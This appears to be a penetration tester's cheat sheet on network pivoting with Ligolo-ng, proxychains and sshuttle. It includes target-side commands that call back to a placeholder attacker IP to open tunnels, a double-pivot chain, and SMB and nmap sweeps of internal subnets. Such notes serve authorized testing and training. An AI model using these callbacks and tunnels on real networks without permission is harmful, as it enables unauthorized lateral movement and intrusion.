---
tags:
  - AD
---
## LigoloNG
---
[https://github.com/Nicocha30/ligolo-ng](https://github.com/Nicocha30/ligolo-ng)

### **Single pivot**

**Attack host:**
```bash
sudo ip tuntap add user kali mode tun ligolo ; sudo ip link set ligolo up
```
```bash
./proxy -selfcert -laddr 0.0.0.0:443
```
add route to new subnet
```bash
sudo ip route add 172.16.139.0/24 dev ligolo
```
**Target:**
```
agent.exe -connect <attackIP>:443 -ignore-cert
```
**Attack host:**
select session
```
session
```
add listeners
```bash
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80
listener_add --addr 0.0.0.0:8081 --to 127.0.0.1:81
listener_add --addr 0.0.0.0:8082 --to 127.0.0.1:82
listener_add --addr 0.0.0.0:8083 --to 127.0.0.1:83
listener_add --addr 0.0.0.0:8084 --to 127.0.0.1:84
```
start tunnel
```bash
start
```
### **Double Pivot**
**Attack host:**
```bash
sudo ip tuntap add user kali mode tun double ; sudo ip link set double up
sudo ip tuntap add user kali mode tun ligolo ; sudo ip link set ligolo up
```
```
./proxy -selfcert -laddr 0.0.0.0:443
```
**Target:**
First pivot callback
```bash
agent.exe -connect <attackIP>:443 -ignore-cert
```
**Attack host:**
Add routes
```bash
sudo ip route add 172.16.139.0/24 dev ligolo
sudo ip route add 172.16.210.0/24 dev double
```
select session
```bash
session
```
add listener for second pivot
```bash
listener_add --addr 0.0.0.0:139 --to 127.0.0.1:443
```
add normal listeners
```bash
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80
listener_add --addr 0.0.0.0:8081 --to 127.0.0.1:81
listener_add --addr 0.0.0.0:8082 --to 127.0.0.1:82
listener_add --addr 0.0.0.0:8083 --to 127.0.0.1:83
listener_add --addr 0.0.0.0:8084 --to 127.0.0.1:84
```
start first tunnel
```bash
start
```
**Second target:**
Call back to first pivot host from second
```bash
agent.exe -connect <targetONE>:139 -ignore-cert
```
add listeners to second host
```bash
listener_add --addr 0.0.0.0:5050 --to 127.0.0.1:50
listener_add --addr 0.0.0.0:5051 --to 127.0.0.1:51
listener_add --addr 0.0.0.0:5052 --to 127.0.0.1:52
listener_add --addr 0.0.0.0:5053 --to 127.0.0.1:53
listener_add --addr 0.0.0.0:5054 --to 127.0.0.1:54
```
start second tunnell
```bash
start --tun double
```
**Verify access**
```bash
nxc smb 172.16.139.10/24 
nxc smb 172.16.210.0/24
```

## proxychains (with SOCKS tunnel)
---
**Start with dynamic SSH port forward**
```bash
ssh -D 9050 user@<jumpIP>
```
**Check proxychains configuration**
```bash
cat /etc/proxychains.conf
or
cat /etc/proxychains4.conf
```
**Ensure its configured to route over the local forward**
```plaintext
# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050
```
**prepend `proxychains` or `proxychains4` to any command to tunnel the traffic**
```bash
proxychains nmap
proxychain msfconsole
proxychains firefox
```
!!! alert "we can only perform a full TCP connect scan over proxychains. The reason for this is that proxychains cannot understand partial packets. If you send partial packets like half connect scans, it will return incorrect results"
```bash
proxychains nmap -v -Pn -sT <internalIP>
```

## sshuttle
---
[https://github.com/sshuttle/sshuttle](https://github.com/sshuttle/sshuttle)

specify the option `-r` to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through
```bash
sudo sshuttle -r user@<jumpHost> 172.16.5.0/23 -v 
```
sshuttle creates an entry in our `iptables` to redirect all traffic to the 172.16.5.0/23 network through the pivot host.
We can now use any tool directly without using proxychains.
```bash
nmap -v -sV 172.16.5.19 -A -Pn
```
